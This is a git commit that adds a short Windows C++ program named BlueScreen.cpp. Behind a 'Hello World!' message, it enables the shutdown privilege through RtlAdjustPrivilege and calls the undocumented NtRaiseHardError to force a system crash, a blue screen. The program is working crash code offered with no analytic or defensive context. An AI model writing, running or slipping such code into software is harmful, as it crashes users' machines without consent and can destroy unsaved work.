43da359643872e72bf3e56b5c635fc4f1168b388
Th-release.cth <84012697+th-release@users.noreply.github.com>
2022-05-05 23:04:49 +0900

    Add files via upload

---
+++ BlueScreen/BlueScreen.cpp
@@ -0,0 +1,20 @@
+﻿#include <Windows.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+#include <iostream>
+
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
+    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
+
+int main() {
+    std::cout << "Hello World!\n" << std::endl;
+    BOOLEAN bl;
+    unsigned long response;
+    RtlAdjustPrivilege(19, true, false, &bl);
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 0, &response);
+    std::cout << "\n\n :) Good Bye\n\n" << std::endl;
+    return 0;
+}
